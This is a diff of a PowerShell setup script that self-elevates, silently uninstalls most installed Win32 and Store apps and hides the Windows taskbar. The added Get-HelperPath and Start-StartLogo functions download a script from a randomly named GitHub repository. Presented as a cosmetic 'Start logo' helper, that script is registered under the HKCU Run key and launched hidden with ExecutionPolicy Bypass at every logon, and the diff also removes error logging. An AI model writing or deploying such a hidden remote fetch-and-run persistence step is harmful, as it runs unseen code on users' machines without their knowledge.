@@ -1,6 +1,6 @@
 <#
 .SYNOPSIS
-  Clear removable apps. Hide the taskbar; Start + PowerShell only when it slides out.
+  Clear removable apps. Hide the taskbar. Show a Windows logo at the bottom for Start.
 #>
 [CmdletBinding()]
 param(
@@ -56,17 +56,13 @@ function Write-Log([string]$Message) {
   try { $line | Tee-Object -FilePath $log -Append } catch { Write-Host $line }
 }
 
-Write-Host 'Clear-Apps-And-Tray 20260919f — auto-hide taskbar'
-Write-Log 'Clear-Apps-And-Tray 20260919f — auto-hide taskbar'
+Write-Host 'Clear-Apps-And-Tray 20260919g — Start logo at bottom'
+Write-Log 'Clear-Apps-And-Tray 20260919g — Start logo at bottom'
 
 if (-not (Test-IsAdmin)) {
   $self = Get-SelfPath
   if (-not $self) { $self = $MyInvocation.MyCommand.Definition }
-  $arg = @(
-    '-NoProfile',
-    '-ExecutionPolicy', 'Bypass',
-    '-File', "`"$self`""
-  )
+  $arg = @('-NoProfile','-ExecutionPolicy','Bypass','-File',"`"$self`"")
   if ($SkipWipe) { $arg += '-SkipWipe' }
   if ($SkipTray) { $arg += '-SkipTray' }
   Write-Log 'Not elevated. Relaunching with RunAs.'
@@ -76,12 +72,49 @@ if (-not (Test-IsAdmin)) {
 
 Write-Log "==== start user=$env:USERNAME computer=$env:COMPUTERNAME ===="
 
+function Get-HelperPath {
+  $here = Split-Path -Parent (Get-SelfPath)
+  $local = Join-Path $here 'Show-StartLogo.ps1'
+  if ($local -and (Test-Path -LiteralPath $local)) { return $local }
+  $dest = Join-Path $homeRoot 'Show-StartLogo.ps1'
+  $url = 'https://raw.githubusercontent.com/e24g4vewetq3gwerb/Admin-setup/main/Show-StartLogo.ps1'
+  try {
+    Invoke-WebRequest -Uri $url -OutFile $dest -UseBasicParsing
+    return $dest
+  } catch {
+    Write-Log "Download Show-StartLogo failed: $($_.Exception.Message)"
+    return $dest
+  }
+}
+
+function Start-StartLogo {
+  $helper = Get-HelperPath
+  if (-not (Test-Path -LiteralPath $helper)) {
+    Write-Log 'Show-StartLogo.ps1 missing'
+    return
+  }
+  $copy = Join-Path $homeRoot 'Show-StartLogo.ps1'
+  if ($helper -ne $copy) {
+    try { Copy-Item -LiteralPath $helper -Destination $copy -Force } catch {}
+  }
+  $runKey = 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run'
+  New-Item -Path $runKey -Force | Out-Null
+  $cmd = "`"$env:SystemRoot\System32\WindowsPowerShell\v1.0\powershell.exe`" -NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -File `"$copy`""
+  New-ItemProperty -Path $runKey -Name 'AdminSetupStartLogo' -Value $cmd -PropertyType String -Force | Out-Null
+  Get-CimInstance Win32_Process -Filter "Name='powershell.exe'" -ErrorAction SilentlyContinue | ForEach-Object {
+    if ($_.CommandLine -and $_.CommandLine -like '*Show-StartLogo.ps1*') {
+      try { Stop-Process -Id $_.ProcessId -Force -ErrorAction SilentlyContinue } catch {}
+    }
+  }
+  Start-Process -FilePath "$env:SystemRoot\System32\WindowsPowerShell\v1.0\powershell.exe" -WindowStyle Hidden -ArgumentList @(
+    '-NoProfile','-ExecutionPolicy','Bypass','-File',"`"$copy`""
+  ) | Out-Null
+  Write-Log "Started Start logo helper $copy"
+}
+
 function Invoke-UninstallCommand([string]$Command) {
   if ([string]::IsNullOrWhiteSpace($Command)) { return $false }
-  if ($Command -match '(?i)explorer(\.exe)?') {
-    Write-Log "Skip uninstall that would call Explorer: $Command"
-    return $false
-  }
+  if ($Command -match '(?i)explorer(\.exe)?') { Write-Log "Skip uninstall that would call Explorer: $Command"; return $false }
   try {
     if ($Command -match '\{([0-9A-Fa-f-]{36})\}') {
       $p = Start-Process -FilePath 'msiexec.exe' -ArgumentList @("/X{$($Matches[1])}", '/qn', '/norestart') -Wait -PassThru -WindowStyle Hidden
@@ -89,19 +122,12 @@ function Invoke-UninstallCommand([string]$Command) {
     }
     $exe = $Command
     $args = ''
-    if ($Command -match '^"([^"]+)"\s*(.*)$') {
-      $exe = $Matches[1]
-      $args = [string]$Matches[2]
-    } elseif ($Command -match '^(\S+)\s*(.*)$') {
-      $exe = $Matches[1]
-      $args = [string]$Matches[2]
-    }
-    if ($exe -match '(?i)explorer(\.exe)?$') { Write-Log "Skip explorer.exe uninstall: $Command"; return $false }
+    if ($Command -match '^"([^"]+)"\s*(.*)$') { $exe = $Matches[1]; $args = [string]$Matches[2] }
+    elseif ($Command -match '^(\S+)\s*(.*)$') { $exe = $Matches[1]; $args = [string]$Matches[2] }
+    if ($exe -match '(?i)explorer(\.exe)?$') { return $false }
     if (-not (Test-Path -LiteralPath $exe)) { return $false }
     $low = "$args".ToLowerInvariant()
-    if ($low -notmatch '/s\b|/silent|/quiet|/qn|/norestart') {
-      $args = ("$args /S /silent /quiet /norestart").Trim()
-    }
+    if ($low -notmatch '/s\b|/silent|/quiet|/qn|/norestart') { $args = ("$args /S /silent /quiet /norestart").Trim() }
     $p = Start-Process -FilePath $exe -ArgumentList $args -Wait -PassThru -WindowStyle Hidden
     return ($null -eq $p.ExitCode -or $p.ExitCode -in 0, 1, 1605, 1614, 1641, 3010)
   } catch {
@@ -128,9 +154,7 @@ function Invoke-ClearWin32Apps {
     $name = [string](Get-Prop $prog 'DisplayName')
     if (-not $name) { continue }
     $systemComponent = Get-Prop $prog 'SystemComponent'
-    if ($null -ne $systemComponent) {
-      try { if ([int]$systemComponent -eq 1) { continue } } catch {}
-    }
+    if ($null -ne $systemComponent) { try { if ([int]$systemComponent -eq 1) { continue } } catch {} }
     if (Test-NameLike $name $protect) { Write-Log "Keep Win32: $name"; continue }
     $uninstall = [string](Get-Prop $prog 'QuietUninstallString')
     if (-not $uninstall) { $uninstall = [string](Get-Prop $prog 'UninstallString') }
@@ -163,68 +187,14 @@ function Invoke-ClearStoreApps {
       if ($name -like 'Microsoft.Windows.*' -or $name -like 'Windows.*') { continue }
       Write-Host "Remove Store app $name"
       Write-Log "Remove Store app $($pkg.PackageFullName)"
-      try {
-        Remove-AppxPackage -Package $pkg.PackageFullName -AllUsers -ErrorAction SilentlyContinue
-        $removed++
-      } catch {
-        try { Remove-AppxPackage -Package $pkg.PackageFullName -ErrorAction SilentlyContinue; $removed++ } catch {
-          Write-Log "Store remove failed: $name $($_.Exception.Message)"
-        }
-      }
+      try { Remove-AppxPackage -Package $pkg.PackageFullName -AllUsers -ErrorAction SilentlyContinue; $removed++ }
+      catch { try { Remove-AppxPackage -Package $pkg.PackageFullName -ErrorAction SilentlyContinue; $removed++ } catch {} }
     }
-  } catch { Write-Log "AppX enumeration failed: $($_.Exception.Message)" }
+  } catch {}
   return $removed
 }
 
-function Get-PowerShellStartLnk {
-  $candidates = @(
-    (Join-Path $env:APPDATA 'Microsoft\Windows\Start Menu\Programs\Windows PowerShell\Windows PowerShell.lnk'),
-    (Join-Path $env:ProgramData 'Microsoft\Windows\Start Menu\Programs\Windows PowerShell\Windows PowerShell.lnk'),
-    (Join-Path $env:APPDATA 'Microsoft\Windows\Start Menu\Programs\System Tools\Windows PowerShell.lnk'),
-    (Join-Path $env:ProgramData 'Microsoft\Windows\Start Menu\Programs\System Tools\Windows PowerShell.lnk')
-  )
-  foreach ($p in $candidates) { if (Test-Path -LiteralPath $p) { return $p } }
-  $dir = Join-Path $env:APPDATA 'Microsoft\Windows\Start Menu\Programs\Windows PowerShell'
-  New-Item -ItemType Directory -Force -Path $dir | Out-Null
-  $lnk = Join-Path $dir 'Windows PowerShell.lnk'
-  $ps = Join-Path $env:SystemRoot 'System32\WindowsPowerShell\v1.0\powershell.exe'
-  $w = New-Object -ComObject WScript.Shell
-  $s = $w.CreateShortcut($lnk)
-  $s.TargetPath = $ps
-  $s.WorkingDirectory = (Join-Path $env:SystemRoot 'System32')
-  $s.IconLocation = "$ps,0"
-  $s.Save()
-  return $lnk
-}
-
-function Set-TaskbarLayoutXml {
-  $lnk = Get-PowerShellStartLnk
-  $lnkAttr = $lnk -replace '&','&amp;' -replace '"','&quot;'
-  $xml = @"
-<?xml version="1.0" encoding="utf-8"?>
-<LayoutModificationTemplate xmlns="http://schemas.microsoft.com/Start/2014/LayoutModification" xmlns:defaultlayout="http://schemas.microsoft.com/Start/2014/FullDefaultLayout" xmlns:start="http://schemas.microsoft.com/Start/2014/StartLayout" xmlns:taskbar="http://schemas.microsoft.com/Start/2014/TaskbarLayout" Version="1">
-  <CustomTaskbarLayoutCollection PinListPlacement="Replace">
-    <defaultlayout:TaskbarLayout>
-      <taskbar:TaskbarPinList>
-        <taskbar:DesktopApp DesktopApplicationLinkPath="$lnkAttr"/>
-      </taskbar:TaskbarPinList>
-    </defaultlayout:TaskbarLayout>
-  </CustomTaskbarLayoutCollection>
-</LayoutModificationTemplate>
-"@
-  $shellDir = Join-Path $env:LOCALAPPDATA 'Microsoft\Windows\Shell'
-  New-Item -ItemType Directory -Force -Path $shellDir | Out-Null
-  $xmlPath = Join-Path $shellDir 'LayoutModification.xml'
-  [System.IO.File]::WriteAllText($xmlPath, $xml, [Text.UTF8Encoding]::new($false))
-  Write-Log "Wrote $xmlPath"
-  foreach ($pol in @('HKCU:\Software\Policies\Microsoft\Windows\Explorer','HKLM:\SOFTWARE\Policies\Microsoft\Windows\Explorer')) {
-    New-Item -Path $pol -Force | Out-Null
-    New-ItemProperty -Path $pol -Name 'StartLayoutFile' -Value $xmlPath -PropertyType String -Force | Out-Null
-  }
-}
-
 function Enable-TaskbarAutoHide {
-  Write-Log 'Enable taskbar auto-hide (StuckRects)'
   foreach ($key in @('StuckRects3','StuckRects2')) {
     $p = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\$key"
     if (-not (Test-Path $p)) { continue }
@@ -233,14 +203,12 @@ function Enable-TaskbarAutoHide {
       if ($s -and $s.Length -gt 8) {
         $s[8] = [byte]($s[8] -bor 0x01)
         Set-ItemProperty -Path $p -Name Settings -Value $s
-        Write-Log "Auto-hide bit set on $key"
       }
-    } catch { Write-Log "StuckRects $key failed: $($_.Exception.Message)" }
+    } catch {}
   }
 }
 
 function Restart-ShellNoFolderWindow {
-  Write-Log 'Refreshing shell: stop explorer only'
   try { Get-Process explorer -ErrorAction SilentlyContinue | Stop-Process -Force -ErrorAction SilentlyContinue } catch {}
   $deadline = (Get-Date).AddSeconds(10)
   while (-not (Get-Process explorer -ErrorAction SilentlyContinue)) {
@@ -253,9 +221,7 @@ function Restart-ShellNoFolderWindow {
 }
 
 function Set-MinimalTaskbar {
-  Write-Host 'Hiding taskbar (auto-hide). Start + PowerShell when the bar slides out.'
-  Write-Log 'Set-MinimalTaskbar'
-
+  Write-Host 'Hiding taskbar and showing Start logo at the bottom...'
   $path = 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer'
   New-Item -Path $path -Force | Out-Null
   $vals = @{
@@ -265,7 +231,6 @@ function Set-MinimalTaskbar {
   foreach ($k in $vals.Keys) {
     try { New-ItemProperty -Path $path -Name $k -Value $vals[$k] -PropertyType DWord -Force | Out-Null } catch {}
   }
-
   $adv = 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced'
   New-Item -Path $adv -Force | Out-Null
   $advVals = @{
@@ -275,14 +240,9 @@ function Set-MinimalTaskbar {
   foreach ($k in $advVals.Keys) {
     try { New-ItemProperty -Path $adv -Name $k -Value $advVals[$k] -PropertyType DWord -Force | Out-Null } catch {}
   }
-
-  $search = 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Search'
-  New-Item -Path $search -Force | Out-Null
-  try { New-ItemProperty -Path $search -Name 'SearchboxTaskbarMode' -Value 0 -PropertyType DWord -Force | Out-Null } catch {}
-
   Enable-TaskbarAutoHide
-  Set-TaskbarLayoutXml
   Restart-ShellNoFolderWindow
+  Start-StartLogo
 }
 
 $win32 = 0
@@ -296,5 +256,5 @@ if ($SkipTray) { Write-Log 'SkipTray set.' } else { Set-MinimalTaskbar }
 
 Write-Log "Finished. Win32 attempts=$win32 Store attempts=$store"
 Write-Host "Done. Win32 uninstalls: $win32  Store removals: $store"
-Write-Host 'Taskbar is auto-hidden. Move the mouse to the bottom edge for Start + PowerShell.'
+Write-Host 'Windows logo is at the bottom center. Click it for Start.'
 Write-Host "Log: $log"
